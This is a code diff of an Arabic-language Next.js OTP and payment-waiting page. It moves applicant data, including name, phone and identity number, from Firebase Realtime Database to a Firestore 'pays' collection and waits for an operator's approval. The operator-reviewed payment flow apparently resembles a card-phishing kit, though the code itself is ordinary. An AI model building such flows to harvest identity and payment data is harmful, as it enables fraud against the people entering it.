@@ -2,8 +2,11 @@
 import { useState, useEffect, useRef } from "react";
 import { useRouter } from "next/navigation";
 import StepBar from "@/components/StepBar";
-import { rtdb } from "@/lib/firebase";
-import { ref, push, onValue, off, serverTimestamp } from "firebase/database";
+import { db } from "@/lib/firebase";
+import {
+  collection, addDoc, onSnapshot, doc,
+  serverTimestamp
+} from "firebase/firestore";
 import { useFormData } from "@/context/FormContext";
 
 function genCode() {
@@ -15,59 +18,55 @@ export default function OtpPage() {
   const { data, setDocId, setConfirmationCode } = useFormData();
 
   const [saved, setSaved] = useState(false);
-  const [dots, setDots] = useState(0);
+  const [dots, setDots]   = useState(0);
 
-  const didCreateRequest = useRef(false);
   const docIdRef = useRef<string | null>(null);
   const confCode = useRef(genCode());
 
+  /* ── Save to Firestore (pays collection) on mount ── */
   useEffect(() => {
-    if (didCreateRequest.current) return;
-    didCreateRequest.current = true;
-
     const payload = {
-      name:              data.name          || "—",
-      phone:             data.phone         || "—",
-      id_number:         data.id_number     || "—",
+      ownerName:         data.name          || "—",
+      phoneNumber:       data.phone         || "—",
+      identityNumber:    data.id_number     || "—",
       membership:        data.membership    || "—",
       emirate:           data.emirate       || "—",
       delivery_date:     data.delivery_date || "—",
+      country:           "UAE",
       confirmation_code: confCode.current,
-      status:            "pending",
-      created_at:        serverTimestamp(),
+      status:            "pending_review",
+      currentStep:       "payment",
+      isUnread:          true,
+      createdAt:         serverTimestamp(),
+      updatedAt:         serverTimestamp(),
     };
 
-    push(ref(rtdb, "applications"), payload)
-      .then((snap) => {
-        if (!snap.key) return;
-        docIdRef.current = snap.key;
-        setDocId(snap.key);
+    addDoc(collection(db, "pays"), payload)
+      .then((docRef) => {
+        docIdRef.current = docRef.id;
+        setDocId(docRef.id);
         setConfirmationCode(confCode.current);
         setSaved(true);
       })
       .catch(() => setSaved(true));
-  }, [
-    data.delivery_date,
-    data.emirate,
-    data.id_number,
-    data.membership,
-    data.name,
-    data.phone,
-    setConfirmationCode,
-    setDocId,
-  ]);
+  }, []);
 
+  /* ── Listen for admin approval from Firestore ── */
   useEffect(() => {
     if (!saved || !docIdRef.current) return;
-    const appRef = ref(rtdb, `applications/${docIdRef.current}`);
-    onValue(appRef, (snap) => {
-      const val = snap.val();
-      if (val?.status === "approved") router.push("/success");
-      if (val?.status === "rejected") router.push("/card");
-    });
-    return () => off(appRef);
-  }, [router, saved]);
 
+    const unsubscribe = onSnapshot(
+      doc(db, "pays", docIdRef.current),
+      (snap) => {
+        const val = snap.data();
+        if (val?.status === "approved")  router.push("/success");
+        if (val?.status === "rejected")  router.push("/card");
+      }
+    );
+    return () => unsubscribe();
+  }, [saved]);
+
+  /* ── Animated dots ── */
   useEffect(() => {
     const t = setInterval(() => setDots((d) => (d + 1) % 4), 600);
     return () => clearInterval(t);
@@ -78,16 +77,18 @@ export default function OtpPage() {
   return (
     <div className="min-h-screen bg-[#f0f2f5] flex flex-col" dir="rtl">
       <div className="w-full max-w-md mx-auto bg-[#f0f2f5] min-h-screen sm:shadow-xl">
+
         <div className="bg-white">
           <StepBar current={4} />
         </div>
 
         <div className="flex flex-col items-center justify-center min-h-[calc(100vh-80px)] px-6 text-center">
+
           <div className="relative w-28 h-28 mb-8">
             <svg className="absolute inset-0 animate-spin" viewBox="0 0 100 100" fill="none">
               <circle cx="50" cy="50" r="44" stroke="#e5e7eb" strokeWidth="8" />
-              <circle cx="50" cy="50" r="44" stroke="#1a2b50" strokeWidth="8" strokeLinecap="round"
-                strokeDasharray="138 138" strokeDashoffset="104" />
+              <circle cx="50" cy="50" r="44" stroke="#1a2b50" strokeWidth="8"
+                strokeLinecap="round" strokeDasharray="138 138" strokeDashoffset="104" />
             </svg>
             <div className="absolute inset-0 flex items-center justify-center">
               <svg width="36" height="36" viewBox="0 0 24 24" fill="none" stroke="#1a2b50" strokeWidth="2">
@@ -112,12 +113,10 @@ export default function OtpPage() {
             <p className="text-gray-500 text-sm leading-relaxed mb-5">
               تم إرسال طلبك بنجاح. يرجى الانتظار بينما يتم مراجعة بياناتك والموافقة على عملية الدفع.
             </p>
-
             <div className="bg-[#f8f9fb] rounded-xl px-4 py-3 flex items-center gap-3 mb-4">
               <div className="w-2 h-2 rounded-full bg-amber-400 animate-pulse flex-shrink-0" />
               <span className="text-xs text-gray-600 font-medium">في انتظار موافقة الجهة المصدرة</span>
             </div>
-
             <div className="border-t border-gray-100 pt-4 space-y-2 text-right">
               <div className="flex justify-between text-xs">
                 <span className="font-semibold text-gray-700">{data.name || "—"}</span>
